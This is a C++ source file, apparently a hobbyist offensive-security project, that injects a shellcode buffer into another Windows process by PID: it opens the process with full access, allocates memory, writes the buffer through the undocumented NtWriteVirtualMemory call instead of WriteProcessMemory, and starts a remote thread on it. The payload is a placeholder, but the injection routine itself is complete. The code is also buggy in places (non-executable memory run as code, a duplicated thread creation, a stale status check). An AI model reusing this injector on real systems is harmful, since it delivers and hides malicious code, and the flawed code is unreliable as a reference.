#include <iostream>
#include <windows.h>
#include <errhandlingapi.h>
#include "TlHelp32.h"
#include "string"

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";
#define out std::wcout <<

// sexy chatgpt!
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)


typedef NTSTATUS(WINAPI* NtCreateThreadExPtr)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN LPVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN LPTHREAD_START_ROUTINE lpStartAddress,
    IN LPVOID lpParameter,
    IN BOOL CreateSuspended,
    IN DWORD StackZeroBits,
    IN DWORD SizeOfStackCommit,
    IN DWORD SizeOfStackReserve,
    OUT LPVOID lpBytesBuffer
    );

typedef NTSTATUS(__stdcall* NtWriteVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN ULONG NumberOfBytesToWrite,
    OUT PULONG NumberOfBytesWritten OPTIONAL
    );

NtWriteVirtualMemory GetNtWriteVirtualMemory() {
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (hNtdll == NULL) {
        std::wcerr << L"Failed to get handle to ntdll.dll\n";
        return nullptr;
    }

    return reinterpret_cast<NtWriteVirtualMemory>(
        GetProcAddress(hNtdll, "NtWriteVirtualMemory")
        );
}


std::wstring GetProcName(DWORD pid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcerr << L" Failed to create process snapshot.\n";
        return L"";
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(processEntry);

    if (!Process32First(hSnapshot, &processEntry)) {
        CloseHandle(hSnapshot);
        std::wcerr << L" Failed to retrieve first process entry.\n";
        return L"";
    }

    do {
        if (processEntry.th32ProcessID == pid) {
            CloseHandle(hSnapshot);
            return std::wstring(processEntry.szExeFile);
        }
    } while (Process32Next(hSnapshot, &processEntry));

    CloseHandle(hSnapshot);
    std::wcerr << L" No process found with PID: " << pid << L"\n";
    return L"";
}


int main()
{
    // rBuffer = VirtualAllocEx(hProcess, NULL, crowPukeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
                                 // da shell code!
    unsigned char shellcode[] = "\x41\x41\x41\x41\x41\x41";
    size_t actualshellsize = sizeof(shellcode);

    HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
    if (hNtdll == NULL) {
        std::cerr << "Failed to load ntdll.dll\n";
        return -1;
    }


    PVOID rBuffer = NULL;
    DWORD dwPID = NULL, dwTID = NULL;
    HANDLE hProcess = NULL, hThread = NULL;
    DWORD procname = NULL;

    std::cout << "Enter PID: ";
    std::cin >> dwPID;
    std::cout << "PID entered: " << dwPID << std::endl;
    // get full access 
    out k << " Getting handle to " << dwPID << "\n";

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (hProcess == NULL)
    {
        out e << " Error getting handle! \n";
        GetLastError();
    }
    std::cout << k << " Got handle to procces at address : " << "0x" << hProcess << "\n";
    std::wstring procName = GetProcName(dwPID);
    if (!procName.empty()) {
        std::wcout << L"Process name for PID " << dwPID << L": " << procName << L"\n";
    }

    std::cout << k << " Allocating shellcode";
    // put shellcode into proc mem!
                            // Proc   addy  shellcode           // mem access!
    rBuffer = VirtualAllocEx(hProcess, NULL, actualshellsize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    // pasting this
    printf("%s allocated %zd-bytes to the process memory w/ PAGE_READWRITE permissions", k, actualshellsize, "\n");
    // instead of writeprocmem we use undocumented ntdll func
    // WriteProcessMemory(hProcess, rBuffer, crowPuke, crowPukeSize, NULL);
    NtWriteVirtualMemory pNtWriteVirtualMemory = GetNtWriteVirtualMemory();
    if (pNtWriteVirtualMemory == nullptr) {
        out  "Failed to get address of NtWriteVirtualMemory function!\n";
        return -1;
    }
    std::cout << k << " Resloved NtWriteVirtualMemory Address at : " << pNtWriteVirtualMemory << "\n";


    // Call NtWriteVirtualMemory
    NTSTATUS status = pNtWriteVirtualMemory(hProcess, rBuffer, shellcode, actualshellsize, NULL);
    if (!NT_SUCCESS(status)) {
        out  "NtWriteVirtualMemory failed with status: " << status << "\n";
        return status;
    }
    std::cout << k << " Writen the shellcode to " << rBuffer << "\n";

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);

    if (hThread == NULL) {
        printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }
    // paste 2 cheat

// fuck it
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);
    // Check if NtCreateThreadEx was successful
    if (!NT_SUCCESS(status)) {
        std::cerr << "NtCreateThreadEx failed with status: " << status << std::endl;
        CloseHandle(hProcess);
        FreeLibrary(hNtdll);
        return -1;
    }

    printf("%s got a handle to the newly-created thread (%ld)\n\\---0x%p\n", k, dwTID, hProcess);

    printf("%s waiting for thread to finish executing\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing, cleaning up\n", k);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s finished, see you next time :>", k);


   
    std::cin.get();

    return EXIT_SUCCESS;
}








// ntapi
/*
HANDLE OpenProcess(
	[in] DWORD dwDesiredAccess,
	[in] BOOL  bInheritHandle,
	[in] DWORD dwProcessId
);

LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);

BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);

HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
);

*/